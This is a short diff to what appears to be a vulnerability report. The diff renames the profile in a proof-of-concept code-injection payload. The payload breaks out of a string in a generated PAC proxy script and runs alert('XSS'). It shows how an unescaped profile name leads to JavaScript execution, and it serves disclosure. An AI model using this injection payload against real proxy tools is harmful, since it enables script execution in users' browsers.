@@ -83,10 +83,10 @@ profileFunctions.push(`    "+${name}": ${functionCode}`);
 #### Proof of Concept:
 ```javascript
 // Malicious Profile Name
-Name: `Workday"; } alert("XSS"); function evil(){//`
+Name: `Example"; } alert("XSS"); function evil(){//`
 
 // Generated PAC Script (BROKEN)
-"+Workday"; } alert("XSS"); function evil(){//": function(...) { ... }
+"+Example"; } alert("XSS"); function evil(){//": function(...) { ... }
 
 // Result: JavaScript execution when PAC script is loaded
 ```
